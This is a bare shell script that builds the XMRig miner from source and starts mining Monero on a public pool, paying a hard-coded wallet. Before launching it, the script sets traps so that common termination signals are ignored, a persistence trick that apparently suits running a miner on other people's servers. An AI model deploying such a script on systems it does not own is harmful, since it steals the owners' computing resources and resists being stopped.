sudo yum -y update
sudo yum -y update
sudo yum install -y epel-release
sudo yum install -y git make cmake gcc gcc-c++ libstdc++-static libuv-static hwloc-devel openssl-devel
git clone https://github.com/xmrig/xmrig.git
cd xmrig && mkdir build && cd build
cmake .. -DUV_LIBRARY=/usr/lib64/libuv.a
make
screen
trap "" 15
trap "" 2
trap "" 3
trap "" 20
trap "" 9
./xmrig --currency monero -o pool.supportxmr.com:3333 -u 89jXMztCjeTZrtbuKL6SKQHJiU1nsdBqzW3XohH5iYFqNibkpAqcjSAZW7HiSTQCuJG2XV8cK58oiYrm2UHD23NUDy1Lmf7 -p x -k --donate-level=1

